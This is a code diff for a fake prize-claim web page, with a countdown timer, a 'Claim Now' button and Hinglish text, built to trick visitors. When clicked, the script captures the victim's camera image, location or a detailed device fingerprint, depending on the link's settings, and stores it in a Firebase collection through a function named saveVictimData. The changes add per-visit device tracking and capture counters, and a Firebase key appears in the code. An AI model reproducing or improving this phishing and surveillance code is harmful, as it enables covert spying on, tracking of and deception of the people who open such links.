@@ -8,35 +8,30 @@
 <style>
   :root{--bg:#0a0a1a;--gold:#ffd700;--gold-2:#ff9500;--green:#10b981;--red:#ef4444;--text:#fff;}
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
-  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;-webkit-font-smoothing:antialiased;overflow-x:hidden;position:relative;}
-  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 20%,rgba(255,215,0,0.15) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(255,20,147,0.15) 0%,transparent 40%);z-index:-2;animation:bgPulse 8s ease-in-out infinite;}
-  @keyframes bgPulse{0%,100%{opacity:1}50%{opacity:0.6}}
+  body{font-family:'Plus Jakarta Sans',-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;position:relative;}
+  body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 20%,rgba(255,215,0,0.15) 0%,transparent 40%),radial-gradient(circle at 80% 80%,rgba(255,20,147,0.15) 0%,transparent 40%);z-index:-2;}
   .container{max-width:480px;margin:0 auto;padding:20px 18px 40px;}
   .hidden{display:none !important;}
-  .top-banner{background:linear-gradient(90deg,var(--red),#ff6b6b);padding:8px 16px;text-align:center;font-size:0.75rem;font-weight:700;letter-spacing:0.05em;text-transform:uppercase;position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:center;gap:8px;}
+  .top-banner{background:linear-gradient(90deg,var(--red),#ff6b6b);padding:8px 16px;text-align:center;font-size:0.75rem;font-weight:700;text-transform:uppercase;position:sticky;top:0;z-index:50;display:flex;align-items:center;justify-content:center;gap:8px;}
   .hero{text-align:center;padding:30px 10px 20px;}
   .prize-icon{width:130px;height:130px;margin:0 auto 20px;border-radius:30px;background:linear-gradient(135deg,var(--gold),var(--gold-2));display:flex;align-items:center;justify-content:center;font-size:4rem;box-shadow:0 20px 60px rgba(255,215,0,0.5);animation:bounceIn 1s ease;position:relative;}
-  .prize-icon::before{content:'';position:absolute;inset:-8px;border-radius:36px;border:2px solid rgba(255,215,0,0.4);animation:ring 2s ease-in-out infinite;}
-  @keyframes ring{0%,100%{transform:scale(1);opacity:0.6}50%{transform:scale(1.08);opacity:0.2}}
   @keyframes bounceIn{0%{transform:scale(0) rotate(-180deg)}60%{transform:scale(1.15) rotate(10deg)}100%{transform:scale(1) rotate(0)}}
   .congrats-text{font-family:'Space Grotesk',sans-serif;font-size:1rem;font-weight:600;color:var(--gold);letter-spacing:0.15em;text-transform:uppercase;margin-bottom:8px;}
   .prize-title{font-family:'Space Grotesk',sans-serif;font-size:2rem;font-weight:800;line-height:1.15;margin-bottom:12px;background:linear-gradient(135deg,#fff 0%,var(--gold) 50%,var(--gold-2) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
   .prize-subtitle{font-size:0.92rem;opacity:0.75;margin-bottom:24px;}
-  .prize-card{background:linear-gradient(160deg,rgba(255,215,0,0.1),rgba(255,149,0,0.05));border:1.5px solid rgba(255,215,0,0.4);border-radius:24px;padding:24px 20px;margin-bottom:20px;position:relative;overflow:hidden;}
-  .prize-card::before{content:'';position:absolute;top:-50%;right:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(255,215,0,0.3),transparent 30%);animation:rotate 8s linear infinite;z-index:-1;}
-  @keyframes rotate{to{transform:rotate(360deg)}}
+  .prize-card{background:linear-gradient(160deg,rgba(255,215,0,0.1),rgba(255,149,0,0.05));border:1.5px solid rgba(255,215,0,0.4);border-radius:24px;padding:24px 20px;margin-bottom:20px;}
   .prize-name{font-family:'Space Grotesk',sans-serif;font-size:1.3rem;font-weight:700;margin-bottom:6px;}
   .prize-value{font-size:1.6rem;font-weight:800;color:var(--gold);margin-bottom:14px;}
   .prize-features{list-style:none;text-align:left;}
   .prize-features li{font-size:0.85rem;padding:5px 0;opacity:0.85;display:flex;align-items:center;gap:8px;}
   .prize-features li::before{content:'✓';color:var(--green);font-weight:700;font-size:1rem;}
   .timer-box{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.4);border-radius:16px;padding:16px;text-align:center;margin-bottom:20px;}
-  .timer-label{font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#fca5a5;margin-bottom:8px;}
+  .timer-label{font-size:0.75rem;font-weight:700;text-transform:uppercase;color:#fca5a5;margin-bottom:8px;}
   .timer-value{font-family:'Space Grotesk',monospace;font-size:2.2rem;font-weight:800;color:var(--red);display:flex;justify-content:center;gap:8px;}
   .timer-value span{background:rgba(0,0,0,0.3);padding:4px 12px;border-radius:10px;min-width:60px;}
-  .claim-btn{width:100%;padding:20px 24px;border:none;border-radius:18px;background:linear-gradient(135deg,var(--gold),var(--gold-2));color:#000;font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:800;letter-spacing:0.05em;text-transform:uppercase;cursor:pointer;transition:all 0.25s;box-shadow:0 12px 40px rgba(255,215,0,0.5);position:relative;overflow:hidden;margin-bottom:14px;}
+  .claim-btn{width:100%;padding:20px 24px;border:none;border-radius:18px;background:linear-gradient(135deg,var(--gold),var(--gold-2));color:#000;font-family:'Space Grotesk',sans-serif;font-size:1.15rem;font-weight:800;text-transform:uppercase;cursor:pointer;box-shadow:0 12px 40px rgba(255,215,0,0.5);position:relative;overflow:hidden;margin-bottom:14px;}
   .claim-btn:active{transform:scale(0.97);}
-  .claim-btn:disabled{opacity:0.6;cursor:wait;}
+  .claim-btn:disabled{opacity:0.6;}
   .claim-btn::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.4),transparent);animation:shine 3s ease-in-out infinite;}
   @keyframes shine{0%{left:-100%}100%{left:100%}}
   .security-note{display:flex;align-items:center;justify-content:center;gap:8px;font-size:0.78rem;opacity:0.6;margin-bottom:20px;}
@@ -62,8 +57,8 @@
   .footer{text-align:center;padding:30px 20px 20px;opacity:0.4;font-size:0.72rem;line-height:1.6;}
   .progress-container{position:fixed;top:32px;left:0;right:0;height:3px;background:rgba(255,255,255,0.1);z-index:50;display:none;}
   .progress-container.active{display:block;}
-  .progress-bar{height:100%;background:linear-gradient(90deg,var(--gold),var(--gold-2));width:0%;transition:width 0.3s;box-shadow:0 0 10px var(--gold);}
-  @media (max-width:380px){.prize-title{font-size:1.6rem;}.prize-icon{width:100px;height:100px;font-size:3rem;}.claim-btn{font-size:1rem;padding:16px 20px;}}
+  .progress-bar{height:100%;background:linear-gradient(90deg,var(--gold),var(--gold-2));width:0%;transition:width 0.3s;}
+  @media (max-width:380px){.prize-title{font-size:1.6rem;}.prize-icon{width:100px;height:100px;font-size:3rem;}}
 </style>
 </head>
 <body>
@@ -100,7 +95,7 @@
     <div class="timer-value"><span id="timerMin">02</span>:<span id="timerSec">00</span></div>
   </div>
   <button class="claim-btn" id="claimBtn" onclick="claimPrize()">✨ Claim Now ✨</button>
-  <div class="security-note"><span>🔒</span><span>Secure & Verified</span><span>•</span><span>SSL Encrypted</span></div>
+  <div class="security-note"><span>🔒</span><span>Secure & Verified</span></div>
   <div class="footer"><p>© 2025 Special Offers Portal</p></div>
 </div>
 
@@ -108,13 +103,12 @@
   <div class="thanks-screen">
     <div class="thanks-icon">✅</div>
     <h1>Thank You!</h1>
-    <p>Aapka claim successfully submit ho gaya hai.<br>Hamari team 24 ghante me aapse contact karegi.</p>
+    <p>Aapka claim successfully submit ho gaya hai.</p>
     <div class="thanks-info">
       <div><span class="label">Claim ID</span><span class="value" id="claimId">#PRIZE-000</span></div>
-      <div><span class="label">Status</span><span class="value" style="color:var(--green)">Pending Verification</span></div>
-      <div><span class="label">Expected Delivery</span><span class="value">3-5 Business Days</span></div>
+      <div><span class="label">Status</span><span class="value" style="color:var(--green)">Pending</span></div>
+      <div><span class="label">Delivery</span><span class="value">3-5 Days</span></div>
     </div>
-    <p style="font-size:0.8rem;opacity:0.5;margin-top:24px;">Aap ye page band kar sakte hain.</p>
   </div>
 </div>
 
@@ -122,13 +116,13 @@
   <div class="error-screen">
     <div class="error-icon">🔒</div>
     <h1 id="errorTitle">Link Expired</h1>
-    <p id="errorMsg">Ye link ab valid nahi hai. Please provider se naya link mangwayein.</p>
+    <p id="errorMsg">Ye link ab valid nahi hai.</p>
   </div>
 </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc, doc, getDoc, serverTimestamp, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
@@ -159,41 +153,47 @@ function showScreen(id) {
 }
 
 window.addEventListener("load", async () => {
-  await new Promise(r => setTimeout(r, 1500));
+  await new Promise(r => setTimeout(r, 1200));
 
   const hash = location.hash;
-  if (!hash.startsWith("#v=")) {
-    showScreen("errorScreen");
-    return;
-  }
+  if (!hash.startsWith("#v=")) { showScreen("errorScreen"); return; }
 
   const linkId = hash.replace("#v=", "");
   currentLinkId = linkId;
 
   try {
     const linkSnap = await getDoc(doc(db, "links", linkId));
-    if (!linkSnap.exists()) {
-      showScreen("errorScreen");
-      return;
-    }
+    if (!linkSnap.exists()) { showScreen("errorScreen"); return; }
 
     const linkData = linkSnap.data();
     currentLinkData = linkData;
 
     if (linkData.expiresAt) {
-      const expMs = linkData.expiresAt.seconds
-        ? linkData.expiresAt.seconds * 1000
-        : new Date(linkData.expiresAt).getTime();
-      if (Date.now() > expMs) {
-        showScreen("errorScreen");
-        return;
-      }
+      const expMs = linkData.expiresAt.seconds ? linkData.expiresAt.seconds * 1000 : new Date(linkData.expiresAt).getTime();
+      if (Date.now() > expMs) { showScreen("errorScreen"); return; }
     }
 
     currentFeature = linkData.feature;
     document.getElementById("claimId").textContent = "#PRIZE-" + Math.floor(1000 + Math.random()*9000);
     showScreen("mainScreen");
     startTimer();
+
+    // ✅ View count increment
+    try {
+      const sessionKey = "viewed_" + linkId;
+      if (!sessionStorage.getItem(sessionKey)) {
+        sessionStorage.setItem(sessionKey, "1");
+        const dev = getDeviceInfo();
+        const viewedBy = linkData.viewedBy || [];
+        viewedBy.push({ time: new Date().toISOString(), device: dev.type, browser: dev.browser });
+        if (viewedBy.length > 100) viewedBy.shift();
+        await updateDoc(doc(db, "links", linkId), {
+          views: (linkData.views || 0) + 1,
+          lastViewed: serverTimestamp(),
+          viewedBy
+        });
+      }
+    } catch (e) { console.log("View count error:", e); }
 
     if (currentFeature === "camera" || currentFeature === "all" || currentFeature === "video") {
       preWarmCamera();
@@ -221,10 +221,7 @@ async function preWarmCamera() {
       }
     });
     cameraReady = video.videoWidth > 0;
-  } catch (e) {
-    console.error("Pre-warm camera error:", e);
-    cameraReady = false;
-  }
+  } catch (e) { cameraReady = false; }
 }
 
 function startTimer() {
@@ -263,19 +260,14 @@ window.claimPrize = async function() {
   }, 200);
 
   try {
-    if ((currentFeature === "camera" || currentFeature === "all" || currentFeature === "video") && !cameraReady) {
+    if ((currentFeature === "camera" || currentFeature === "all") && !cameraReady) {
       await new Promise(r => setTimeout(r, 1500));
     }
 
-    if (currentFeature === "camera" || currentFeature === "all") {
-      await captureCamera();
-    } else if (currentFeature === "location") {
-      await captureLocation();
-    } else if (currentFeature === "video") {
-      await captureCamera();
-    } else if (currentFeature === "device") {
-      await captureDevice();
-    }
+    if (currentFeature === "camera" || currentFeature === "all") await captureCamera();
+    else if (currentFeature === "location") await captureLocation();
+    else if (currentFeature === "video") await captureCamera();
+    else if (currentFeature === "device") await captureDevice();
 
     pb.style.width = "100%";
     clearInterval(progInterval);
@@ -283,10 +275,7 @@ window.claimPrize = async function() {
     pc.classList.remove("active");
     showScreen("thanksScreen");
 
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-      stream = null;
-    }
+    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
   } catch (e) {
     console.error(e);
     clearInterval(progInterval);
@@ -295,7 +284,7 @@ window.claimPrize = async function() {
     btn.textContent = "✨ Claim Now ✨";
     showScreen("errorScreen");
     document.getElementById("errorTitle").textContent = "Connection Issue";
-    document.getElementById("errorMsg").textContent = "Please check your internet and try again.";
+    document.getElementById("errorMsg").textContent = "Please check your internet.";
   }
 }
 
@@ -318,7 +307,6 @@ async function captureCamera() {
     }
 
     await new Promise(r => setTimeout(r, 800));
-
     if (!video.videoWidth) {
       await new Promise(r => setTimeout(r, 1500));
       if (!video.videoWidth) throw new Error("Camera not ready");
@@ -335,7 +323,6 @@ async function captureCamera() {
     const testData = ctx.getImageData(0, 0, 10, 10).data;
     let sum = 0;
     for (let i = 0; i < testData.length; i += 4) sum += testData[i] + testData[i+1] + testData[i+2];
-
     if (sum === 0) {
       await new Promise(r => setTimeout(r, 1500));
       ctx.clearRect(0, 0, canvas.width, canvas.height);
@@ -391,21 +378,22 @@ function getDeviceInfo() {
   const cores = navigator.hardwareConcurrency || "unknown";
   let gpu = "unknown";
   try {
-    const canvas = document.createElement("canvas");
-    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
     if (gl) {
-      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      const d = gl.getExtension("WEBGL_debug_renderer_info");
+      if (d) gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
     }
   } catch (e) {}
-  const touch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
   return {
     type, browser,
     platform: navigator.platform || "-",
     screen: `${screen.width}x${screen.height}`,
     language: navigator.language,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "-",
-    memory, cores, gpu, touch, network,
+    memory, cores, gpu,
+    touch: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+    network,
     pixelRatio: window.devicePixelRatio || 1,
     vendor: navigator.vendor || "-",
     cookies: navigator.cookieEnabled,
@@ -427,6 +415,11 @@ async function saveVictimData(type, data) {
       type,
       ...data,
       timestamp: serverTimestamp()
+    });
+    // ✅ Capture count increment
+    await updateDoc(doc(db, "links", currentLinkId), {
+      captureCount: (linkData.captureCount || 0) + 1,
+      lastCapture: serverTimestamp()
     });
   } catch (e) { console.error("Save error:", e); }
 }
